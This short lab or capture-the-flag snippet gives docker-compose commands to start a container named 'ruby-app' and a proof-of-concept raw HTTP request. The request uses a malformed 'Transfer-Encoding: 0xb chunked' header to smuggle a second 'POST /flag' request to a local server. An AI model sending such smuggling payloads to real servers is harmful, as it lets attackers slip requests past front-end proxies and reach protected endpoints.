```
docker-compose up -d
docker attach ruby-app(コンテナ名）
```

# POC
```
POST / HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/html
Content-Length: 129
Connection: keep-alive
Transfer-Encoding: 0xb chunked

1
A
0

POST /flag HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 180
Connection: keep-alive
Content-Type: text/html
URI:
```
